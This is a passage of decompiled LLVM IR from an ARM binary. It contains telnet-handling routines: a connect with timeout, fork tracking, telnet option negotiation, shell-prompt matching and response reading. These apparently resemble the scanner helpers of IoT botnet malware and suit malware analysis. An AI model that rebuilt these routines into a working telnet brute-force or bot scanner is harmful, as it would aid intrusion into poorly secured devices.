  %v3_a02c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_28250.66 to i32))
  store i32 %v3_a014, i32* @fp, align 4
  ret i32 %v3_a02c

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 41044, i32* %stack_var_-4, align 4
  %v2_a050 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a050, i32* @fp, align 4
  %v1_a060 = call i32 @contains_success(i32 %arg1)
  %v2_a068 = icmp eq i32 %v1_a060, 0
  br i1 %v2_a068, label %dec_label_pc_a070, label %dec_label_pc_a098

dec_label_pc_a070:                                ; preds = %entry
  %v1_a074 = call i32 @contains_fail(i32 %arg1)
  %v2_a07c = icmp ne i32 %v1_a074, 0
  %. = zext i1 %v2_a07c to i32
  br label %dec_label_pc_a098

dec_label_pc_a098:                                ; preds = %dec_label_pc_a070, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_a070 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_a0dc

dec_label_pc_a0dc:                                ; preds = %dec_label_pc_a0dc, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_a0e0, %dec_label_pc_a0dc ]
  %v1_a0e0 = add i32 %stack_var_-24.0, 1
  %v3_a0ec = mul i32 %v1_a0e0, 4
  %v2_a0f8 = add i32 %v3_a0ec, %arg2
  %v1_a0fc = inttoptr i32 %v2_a0f8 to i32*
  %v2_a0fc = load i32, i32* %v1_a0fc, align 4
  %v2_a100 = icmp eq i32 %v2_a0fc, 0
  br i1 %v2_a100, label %dec_label_pc_a15c.preheader, label %dec_label_pc_a0dc

dec_label_pc_a15c.preheader:                      ; preds = %dec_label_pc_a0dc
  %v3_a134 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_a15c

dec_label_pc_a114:                                ; preds = %dec_label_pc_a15c
  %v3_a118 = mul i32 %storemerge2, 4
  %v2_a124 = add i32 %v3_a118, %arg2
  %v1_a128 = inttoptr i32 %v2_a124 to i32*
  %v2_a128 = load i32, i32* %v1_a128, align 4
  %v4_a134 = call i32 @strcasestr(i8* %v3_a134, i32 %v2_a128, i32 %v3_a118)
  %v2_a13c = icmp eq i32 %v4_a134, 0
  %v1_a154 = add nuw i32 %storemerge2, 1
  br i1 %v2_a13c, label %dec_label_pc_a15c, label %dec_label_pc_a174

dec_label_pc_a15c:                                ; preds = %dec_label_pc_a114, %dec_label_pc_a15c.preheader
  %storemerge2 = phi i32 [ %v1_a154, %dec_label_pc_a114 ], [ 0, %dec_label_pc_a15c.preheader ]
  %v5_a168 = icmp slt i32 %storemerge2, %v1_a0e0
  br i1 %v5_a168, label %dec_label_pc_a114, label %dec_label_pc_a174

dec_label_pc_a174:                                ; preds = %dec_label_pc_a15c, %dec_label_pc_a114
  %storemerge = phi i32 [ 1, %dec_label_pc_a114 ], [ 0, %dec_label_pc_a15c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_a0e0, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a18c = load i32, i32* @fp, align 4
  store i32 %v3_a18c, i32* %stack_var_-16, align 4
  %v13_a18c = ptrtoint i32* %stack_var_-16 to i32
  %v2_a1b4 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a1c4 = or i32 %v2_a1b4, 2048
  store i32 %v1_a1c4, i32* @r3, align 4
  %v2_a1d8 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a1ec = urem i32 %arg3, 65536
  %v1_a1f4 = call i32 @__GI_htons(i32 %v3_a1ec)
  %v3_a214 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a21c = icmp eq i32 %v3_a214, 0
  br i1 %v2_a21c, label %dec_label_pc_a230, label %dec_label_pc_a224

dec_label_pc_a224:                                ; preds = %entry
  br label %dec_label_pc_a3e8

dec_label_pc_a230:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_a244 = bitcast i32* %stack_var_-40 to i8*
  %v3_a244 = call i32 @__GI_memset(i8* %v2_a244, i32 0)
  %v2_a248 = ptrtoint i32* %stack_var_-48 to i32
  %v3_a258 = call i32 @__libc_connect(i32 %arg1, i32 %v2_a248, i32 16)
  store i32 %v3_a258, i32* @r3, align 4
  %v1_a268 = icmp slt i32 %v3_a258, 0
  br i1 %v1_a268, label %dec_label_pc_a270, label %dec_label_pc_a3ac

dec_label_pc_a270:                                ; preds = %dec_label_pc_a230
  %v0_a270 = call i32 @__GI___errno_location()
  %v1_a278 = inttoptr i32 %v0_a270 to i32*
  %v2_a278 = load i32, i32* %v1_a278, align 4
  %v7_a27c = icmp eq i32 %v2_a278, 115
  br i1 %v7_a27c, label %dec_label_pc_a2a8.lr.ph, label %dec_label_pc_a3a0

dec_label_pc_a2a8.lr.ph:                          ; preds = %dec_label_pc_a270
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a294 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a2a8

dec_label_pc_a2a8:                                ; preds = %dec_label_pc_a2a8.lr.ph, %dec_label_pc_a2a8
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a2a8.lr.ph ], [ %v1_a2bc, %dec_label_pc_a2a8 ]
  %v5_a2b4 = mul nuw nsw i32 %storemerge14, 4
  %v6_a2b4 = add i32 %v5_a2b4, %v2_a294
  %v7_a2b4 = inttoptr i32 %v6_a2b4 to i32*
  store i32 0, i32* %v7_a2b4, align 4
  %v1_a2bc = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_a2bc, 32
  br i1 %tmp28, label %dec_label_pc_a2a8, label %dec_label_pc_a2d0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a2a8
  %v3_a2d4 = udiv i32 %arg1, 32
  %v3_a2e0 = mul nuw nsw i32 %v3_a2d4, 4
  %v2_a2e8 = add nsw i32 %v3_a2e0, -160
  %v2_a2ec = add i32 %v2_a2e8, %v13_a18c
  %v1_a2f0 = inttoptr i32 %v2_a2ec to i32*
  %v2_a2f0 = load i32, i32* %v1_a2f0, align 4
  %v1_a2f8 = urem i32 %arg1, 32
  %v6_a300 = shl i32 1, %v1_a2f8
  %v2_a304 = or i32 %v2_a2f0, %v6_a300
  store i32 %v2_a304, i32* %v1_a2f0, align 4
  %v1_a324 = add i32 %arg1, 1
  %v2_a32c = ptrtoint i32* %stack_var_-184 to i32
  %v5_a344 = call i32 @__libc_select(i32 %v1_a324, i32 0, i32 %v2_a294, i32 0, i32 %v2_a32c)
  %tmp29 = icmp slt i32 %v5_a344, 1
  br i1 %tmp29, label %dec_label_pc_a394, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a2d0
  store i32 4, i32* %stack_var_-188, align 4
  %v2_a35c = ptrtoint i32* %stack_var_-192 to i32
  %v2_a360 = ptrtoint i32* %stack_var_-188 to i32
  %v5_a378 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_a35c, i32 %v2_a360)
  %v3_a37c = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a37c, i32* @r3, align 4
  %v2_a380 = icmp eq i32 %v3_a37c, 0
  br i1 %v2_a380, label %dec_label_pc_a3ac, label %dec_label_pc_a388

dec_label_pc_a388:                                ; preds = %dec_label_pc_a354
  br label %dec_label_pc_a3e8

dec_label_pc_a394:                                ; preds = %dec_label_pc_a2d0
  br label %dec_label_pc_a3e8

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a270
  br label %dec_label_pc_a3e8

dec_label_pc_a3ac:                                ; preds = %dec_label_pc_a230, %dec_label_pc_a354
  %v2_a3b8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a3c8 = and i32 %v2_a3b8, -2049
  store i32 %v1_a3c8, i32* @r3, align 4
  %v2_a3dc = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a3e8

dec_label_pc_a3e8:                                ; preds = %dec_label_pc_a3a0, %dec_label_pc_a394, %dec_label_pc_a388, %dec_label_pc_a224, %dec_label_pc_a3ac
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a394 ], [ 1, %dec_label_pc_a3ac ], [ 0, %dec_label_pc_a388 ], [ 0, %dec_label_pc_a3a0 ], [ 0, %dec_label_pc_a224 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a294, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a3e8, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a3ac, { 1, 0 }
  uselistorder label %dec_label_pc_a2a8, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_a3fc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a3fc, i32* @ip, align 4
  %v3_a400 = load i32, i32* @r4, align 4
  %v6_a400 = load i32, i32* @r5, align 4
  %v9_a400 = load i32, i32* @r6, align 4
  %v12_a400 = load i32, i32* @fp, align 4
  store i32 41992, i32* %stack_var_-4, align 4
  %v2_a404 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a404, i32* @fp, align 4
  %v0_a40c = call i32 @__libc_fork()
  %v2_a41c = icmp eq i32 %v0_a40c, 0
  br i1 %v2_a41c, label %dec_label_pc_a588, label %dec_label_pc_a430

dec_label_pc_a430:                                ; preds = %entry
  %v2_a434 = load i32, i32* @global_var_28578.68, align 4
  %v5_a434 = load i32, i32* @global_var_2857c.69, align 4
  %v2_a440 = add i32 %v2_a434, 1
  %v3_a440 = icmp eq i32 %v2_a440, 0
  %v4_a444 = zext i1 %v3_a440 to i32
  %v5_a444 = add i32 %v4_a444, %v5_a434
  store i32 %v2_a440, i32* @global_var_28578.68, align 4
  store i32 %v5_a444, i32* @global_var_2857c.69, align 4
  %v2_a460 = add i32 %v2_a434, 2
  %v3_a460 = icmp eq i32 %v2_a440, -1
  %v4_a464 = zext i1 %v3_a460 to i32
  %v5_a464 = add i32 %v5_a444, %v4_a464
  %v3_a468 = udiv i32 %v2_a460, 1073741824
  %v3_a46c = mul i32 %v5_a464, 4
  %v2_a470 = or i32 %v3_a46c, %v3_a468
  store i32 %v2_a470, i32* @r4, align 4
  %v3_a474 = mul i32 %v2_a460, 4
  %v1_a47c = call i32 @malloc(i32 %v3_a474)
  br label %dec_label_pc_a4d4

dec_label_pc_a494:                                ; preds = %dec_label_pc_a4d4, %dec_label_pc_a520
  %v3_a498 = mul i32 %storemerge2, 4
  %v2_a4a4 = add i32 %v3_a498, %v1_a47c
  %v2_a4b8 = load i32, i32* @global_var_2e7d8.71, align 4
  %v2_a4bc = add i32 %v2_a4b8, %v3_a498
  %v1_a4c0 = inttoptr i32 %v2_a4bc to i32*
  %v2_a4c0 = load i32, i32* %v1_a4c0, align 4
  %v2_a4c4 = inttoptr i32 %v2_a4a4 to i32*
  store i32 %v2_a4c0, i32* %v2_a4c4, align 4
  %v1_a4cc = add i32 %storemerge2, 1
  br label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a430, %dec_label_pc_a494
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a430 ], [ %v1_a4cc, %dec_label_pc_a494 ]
  %v2_a4ec = load i32, i32* @global_var_28578.68, align 4
  %v5_a4ec = load i32, i32* @global_var_2857c.69, align 4
  %v2_a500 = add i32 %v2_a4ec, -1
  %v3_a500 = icmp ne i32 %v2_a4ec, 0
  %v3_a504 = add i32 %v5_a4ec, -1
  %v5_a504 = sext i1 %v3_a500 to i32
  %v9_a518 = icmp eq i32 %v3_a504, %v5_a504
  br i1 %v9_a518, label %dec_label_pc_a520, label %dec_label_pc_a494

dec_label_pc_a520:                                ; preds = %dec_label_pc_a4d4
  store i32 %v2_a500, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a500, %storemerge2
  br i1 %tmp, label %dec_label_pc_a494, label %dec_label_pc_a540

dec_label_pc_a540:                                ; preds = %dec_label_pc_a520
  store i32 %v5_a4ec, i32* @r4, align 4
  %v3_a548 = mul i32 %v2_a4ec, 4
  %v1_a54c = add i32 %v1_a47c, -4
  %v2_a558 = add i32 %v1_a54c, %v3_a548
  %v2_a560 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a40c, i32* %v2_a560, align 4
  %v2_a568 = load i32, i32* @global_var_2e7d8.71, align 4
  store i32 %v2_a568, i32* @r0, align 4
  %v0_a570 = call i32 @free()
  store i32 %v1_a47c, i32* @global_var_2e7d8.71, align 4
  br label %dec_label_pc_a588

dec_label_pc_a588:                                ; preds = %entry, %dec_label_pc_a540
  store i32 %v3_a400, i32* @r4, align 4
  store i32 %v6_a400, i32* @r5, align 4
  store i32 %v9_a400, i32* @r6, align 4
  store i32 %v12_a400, i32* @fp, align 4
  ret i32 %v0_a40c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a498, { 1, 0 }
  uselistorder i32 %v1_a47c, { 2, 0, 1 }
  uselistorder i32 %v2_a440, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a588, { 1, 0 }
  uselistorder label %dec_label_pc_a4d4, { 1, 0 }
  uselistorder label %dec_label_pc_a494, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a5c4 = add i32 %arg2, 1
  %v1_a5c8 = inttoptr i32 %v1_a5c4 to i8*
  %v2_a5c8 = load i8, i8* %v1_a5c8, align 1
  %v7_a5d4 = icmp ult i8 %v2_a5c8, -5
  br i1 %v7_a5d4, label %dec_label_pc_a720, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %entry
  %v7_a5e4 = icmp eq i8 %v2_a5c8, -1
  br i1 %v7_a5e4, label %dec_label_pc_a5e8, label %dec_label_pc_a604

dec_label_pc_a5e8:                                ; preds = %dec_label_pc_a5dc
  br label %dec_label_pc_a720

dec_label_pc_a604:                                ; preds = %dec_label_pc_a5dc
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a60c = ptrtoint i8* %stack_var_-17 to i32
  %v5_a620 = call i32 @__libc_send(i32 %arg1, i32 %v2_a60c, i32 1, i32 16384)
  %v2_a62c = load i8, i8* %v1_a5c8, align 1
  %v7_a630 = icmp eq i8 %v2_a62c, -4
  br i1 %v7_a630, label %dec_label_pc_a638, label %dec_label_pc_a644

dec_label_pc_a638:                                ; preds = %dec_label_pc_a604
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a644:                                ; preds = %dec_label_pc_a604
  %v2_a64c = load i8, i8* %v1_a5c8, align 1
  %v7_a650 = icmp eq i8 %v2_a64c, -2
  br i1 %v7_a650, label %dec_label_pc_a658, label %dec_label_pc_a664

dec_label_pc_a658:                                ; preds = %dec_label_pc_a644
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a664:                                ; preds = %dec_label_pc_a644
  %v2_a66c = load i8, i8* %v1_a5c8, align 1
  %v7_a670 = icmp eq i8 %v2_a66c, 3
  %v7_a684 = icmp eq i8 %v2_a66c, -3
  br i1 %v7_a670, label %dec_label_pc_a678, label %dec_label_pc_a6b0

dec_label_pc_a678:                                ; preds = %dec_label_pc_a664
  br i1 %v7_a684, label %dec_label_pc_a68c, label %dec_label_pc_a698

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a678
  br label %dec_label_pc_a6a0

dec_label_pc_a698:                                ; preds = %dec_label_pc_a678
  br label %dec_label_pc_a6a0

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a68c, %dec_label_pc_a698
  %storemerge = phi i8 [ -3, %dec_label_pc_a698 ], [ -5, %dec_label_pc_a68c ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a6b0:                                ; preds = %dec_label_pc_a664
  br i1 %v7_a684, label %dec_label_pc_a6c4, label %dec_label_pc_a6d0

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a6b0
  br label %dec_label_pc_a6d8

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a6b0
  br label %dec_label_pc_a6d8

dec_label_pc_a6d8:                                ; preds = %dec_label_pc_a6c4, %dec_label_pc_a6d0
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a6d0 ], [ -4, %dec_label_pc_a6c4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a6e4

dec_label_pc_a6e4:                                ; preds = %dec_label_pc_a6a0, %dec_label_pc_a658, %dec_label_pc_a638, %dec_label_pc_a6d8
  %v4_a6f8 = call i32 @__libc_send(i32 %arg1, i32 %v2_a60c, i32 1, i32 16384)
  %v1_a700 = add i32 %arg2, 2
  %v4_a714 = call i32 @__libc_send(i32 %arg1, i32 %v1_a700, i32 1, i32 16384)
  br label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a5e8, %dec_label_pc_a6e4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a720, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a6e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a6d8, { 1, 0 }
  uselistorder label %dec_label_pc_a6a0, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a754 = call i32 @strlen(i8* %arg1)
  %v2_a79c = add i32 %v3_a754, %tmp
  br label %dec_label_pc_a870

dec_label_pc_a774:                                ; preds = %dec_label_pc_a7fc, %dec_label_pc_a7d8, %dec_label_pc_a7b4, %dec_label_pc_a790
  %v1_a778 = add nsw i32 %stack_var_-28.014, 1
  %v7_a78c = icmp sgt i32 %v3_a754, %v1_a778
  br i1 %v7_a78c, label %dec_label_pc_a790, label %dec_label_pc_a820

dec_label_pc_a790:                                ; preds = %dec_label_pc_a780.preheader, %dec_label_pc_a774
  %stack_var_-28.014 = phi i32 [ %v1_a778, %dec_label_pc_a774 ], [ %stack_var_-28.1, %dec_label_pc_a780.preheader ]
  %v2_a7a4 = sub i32 %v2_a79c, %stack_var_-28.014
  %v1_a7a8 = inttoptr i32 %v2_a7a4 to i8*
  %v2_a7a8 = load i8, i8* %v1_a7a8, align 1
  %v2_a7ac = icmp eq i8 %v2_a7a8, 0
  br i1 %v2_a7ac, label %dec_label_pc_a774, label %dec_label_pc_a7b4

dec_label_pc_a7b4:                                ; preds = %dec_label_pc_a790
  %v2_a7cc = load i8, i8* %v1_a7a8, align 1
  %v7_a7d0 = icmp eq i8 %v2_a7cc, 32
  br i1 %v7_a7d0, label %dec_label_pc_a774, label %dec_label_pc_a7d8

dec_label_pc_a7d8:                                ; preds = %dec_label_pc_a7b4
  %v2_a7f0 = load i8, i8* %v1_a7a8, align 1
  %v7_a7f4 = icmp eq i8 %v2_a7f0, 13
  br i1 %v7_a7f4, label %dec_label_pc_a774, label %dec_label_pc_a7fc

dec_label_pc_a7fc:                                ; preds = %dec_label_pc_a7d8
  %v2_a814 = load i8, i8* %v1_a7a8, align 1
  %v7_a818 = icmp eq i8 %v2_a814, 10
  br i1 %v7_a818, label %dec_label_pc_a774, label %dec_label_pc_a820

dec_label_pc_a820:                                ; preds = %dec_label_pc_a7fc, %dec_label_pc_a774, %dec_label_pc_a780.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a780.preheader ], [ %stack_var_-28.014, %dec_label_pc_a7fc ], [ %v1_a778, %dec_label_pc_a774 ]
  %v2_a834 = sub i32 %v2_a79c, %stack_var_-28.0.lcssa
  %v1_a838 = inttoptr i32 %v2_a834 to i8*
  %v2_a838 = load i8, i8* %v1_a838, align 1
  %v2_a848 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_1df2c.73 to i32)
  %v1_a84c = inttoptr i32 %v2_a848 to i8*
  %v2_a84c = load i8, i8* %v1_a84c, align 1
  %v9_a850 = icmp eq i8 %v2_a838, %v2_a84c
  %v1_a868 = add i32 %storemerge3, 1
  br i1 %v9_a850, label %dec_label_pc_a890, label %dec_label_pc_a870

dec_label_pc_a870:                                ; preds = %dec_label_pc_a820, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a820 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a868, %dec_label_pc_a820 ]
  %v3_a878 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1df2c.73, i32 0, i32 0))
  %v3_a880 = icmp ult i32 %storemerge3, %v3_a878
  br i1 %v3_a880, label %dec_label_pc_a780.preheader, label %dec_label_pc_a890

dec_label_pc_a780.preheader:                      ; preds = %dec_label_pc_a870
  %v7_a78c13 = icmp sgt i32 %v3_a754, %stack_var_-28.1
  br i1 %v7_a78c13, label %dec_label_pc_a790, label %dec_label_pc_a820

dec_label_pc_a890:                                ; preds = %dec_label_pc_a870, %dec_label_pc_a820
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a820 ], [ 0, %dec_label_pc_a870 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a754, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a820, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a8ac = load i32, i32* @fp, align 4
  store i32 %v3_a8ac, i32* %stack_var_-16, align 4
  %v13_a8ac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a8fc = ptrtoint i32* %stack_var_-168 to i32
  %v3_a93c = udiv i32 %arg1, 32
  %v3_a948 = mul nuw nsw i32 %v3_a93c, 4
  %v1_a960 = urem i32 %arg1, 32
  %v6_a968 = shl i32 1, %v1_a960
  %v1_a98c = add i32 %arg1, 1
  %v2_a994 = ptrtoint i32* %stack_var_-176 to i32
  %v6_aab4 = inttoptr i32 %arg2 to i8*
  %v2_aac8 = icmp eq i32 %arg3, 0
  %v1_aad4 = inttoptr i32 %arg6 to i8*
  %v5_ab18 = icmp sgt i32 %arg5, 0
  %v2_a950 = add nsw i32 %v3_a948, -152
  %v2_a954 = add i32 %v2_a950, %v13_a8ac
  %v1_a958 = inttoptr i32 %v2_a954 to i32*
  br label %dec_label_pc_aaf0

dec_label_pc_a910.lr.ph:                          ; preds = %dec_label_pc_ab04, %dec_label_pc_ab10
  br label %dec_label_pc_a910

dec_label_pc_a910:                                ; preds = %dec_label_pc_a910.lr.ph, %dec_label_pc_a910
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a910.lr.ph ], [ %v1_a924, %dec_label_pc_a910 ]
  %v5_a91c = mul nuw nsw i32 %storemerge27, 4
  %v6_a91c = add i32 %v5_a91c, %v2_a8fc
  %v7_a91c = inttoptr i32 %v6_a91c to i32*
  store i32 0, i32* %v7_a91c, align 4
  %v1_a924 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a924, 32
  br i1 %tmp30, label %dec_label_pc_a910, label %dec_label_pc_a938

dec_label_pc_a938:                                ; preds = %dec_label_pc_a910
  %v2_a958 = load i32, i32* %v1_a958, align 4
  %v2_a96c = or i32 %v2_a958, %v6_a968
  store i32 %v2_a96c, i32* %v1_a958, align 4
  %v5_a9a8 = call i32 @__libc_select(i32 %v1_a98c, i32 %v2_a8fc, i32 0, i32 0, i32 %v2_a994)
  %tmp31 = icmp slt i32 %v5_a9a8, 1
  br i1 %tmp31, label %dec_label_pc_ab34, label %dec_label_pc_a9b8

dec_label_pc_a9b8:                                ; preds = %dec_label_pc_a938
  %v2_a9c4 = add i32 %stack_var_-40.0, %arg6
  %v5_a9c8 = inttoptr i32 %v2_a9c4 to i8*
  %v6_a9dc = call i32 @__libc_recv(i32 %arg1, i32 %v2_a9c4, i32 1, i32 0, i32 %v2_a9c4)
  %v7_a9ec = icmp eq i32 %v6_a9dc, -1
  br i1 %v7_a9ec, label %dec_label_pc_aa00, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_a9b8
  %v2_a9f8 = icmp eq i32 %v6_a9dc, 0
  br i1 %v2_a9f8, label %dec_label_pc_aa00, label %dec_label_pc_aa0c

dec_label_pc_aa00:                                ; preds = %dec_label_pc_a9f4, %dec_label_pc_a9b8
  br label %dec_label_pc_ab3c

dec_label_pc_aa0c:                                ; preds = %dec_label_pc_a9f4
  %v2_aa14 = add i32 %v6_a9dc, %stack_var_-40.0
  %v2_aa20 = load i8, i8* %v5_a9c8, align 1
  %v2_aa24 = icmp eq i8 %v2_aa20, -1
  br i1 %v2_aa24, label %dec_label_pc_aa2c, label %dec_label_pc_aaac

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_aa0c
  %v1_aa30 = add i32 %v2_a9c4, 1
  %v5_aa44 = call i32 @__libc_recv(i32 %arg1, i32 %v1_aa30, i32 2, i32 0, i32 %v2_aa14)
  %v7_aa54 = icmp eq i32 %v5_aa44, -1
  br i1 %v7_aa54, label %dec_label_pc_aa68, label %dec_label_pc_aa5c

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_aa2c
  %v2_aa60 = icmp eq i32 %v5_aa44, 0
  br i1 %v2_aa60, label %dec_label_pc_aa68, label %dec_label_pc_aa74

dec_label_pc_aa68:                                ; preds = %dec_label_pc_aa5c, %dec_label_pc_aa2c
  br label %dec_label_pc_ab3c

dec_label_pc_aa74:                                ; preds = %dec_label_pc_aa5c
  %v2_aa7c = add i32 %v5_aa44, %v2_aa14
  %v5_aa90 = call i32 @negotiate(i32 %arg1, i32 %v2_a9c4, i32 3, i32 %v2_aa7c, i32 %v2_aa7c)
  %v2_aa98 = icmp eq i32 %v5_aa90, 0
  br i1 %v2_aa98, label %dec_label_pc_aaa0, label %dec_label_pc_aaf0

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa74
  br label %dec_label_pc_ab3c

dec_label_pc_aaac:                                ; preds = %dec_label_pc_aa0c
  %v7_aab4 = call i32 @strstr(i32 %arg6, i8* %v6_aab4)
  %v2_aabc = icmp eq i32 %v7_aab4, 0
  br i1 %v2_aabc, label %dec_label_pc_aac4, label %dec_label_pc_ab28

dec_label_pc_aac4:                                ; preds = %dec_label_pc_aaac
  br i1 %v2_aac8, label %dec_label_pc_aaf0, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aac4
  %v2_aad4 = call i32 @matchPrompt(i8* %v1_aad4)
  %v2_aadc = icmp eq i32 %v2_aad4, 0
  br i1 %v2_aadc, label %dec_label_pc_aaf0, label %dec_label_pc_ab28

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_aa74, %dec_label_pc_aad0, %dec_label_pc_aac4, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_aa7c, %dec_label_pc_aa74 ], [ %v2_aa14, %dec_label_pc_aac4 ], [ %v2_aa14, %dec_label_pc_aad0 ]
  %v1_aaf4 = add i32 %stack_var_-40.0, 2
  %v6_ab00 = icmp slt i32 %v1_aaf4, %arg7
  br i1 %v6_ab00, label %dec_label_pc_ab04, label %dec_label_pc_ab34

dec_label_pc_ab04:                                ; preds = %dec_label_pc_aaf0
  %v3_ab04 = load i32, i32* %stack_var_-176, align 4
  %v5_ab0c = icmp sgt i32 %v3_ab04, 0
  br i1 %v5_ab0c, label %dec_label_pc_a910.lr.ph, label %dec_label_pc_ab10

dec_label_pc_ab10:                                ; preds = %dec_label_pc_ab04
  br i1 %v5_ab18, label %dec_label_pc_a910.lr.ph, label %dec_label_pc_ab34

dec_label_pc_ab28:                                ; preds = %dec_label_pc_aaac, %dec_label_pc_aad0
  br label %dec_label_pc_ab3c

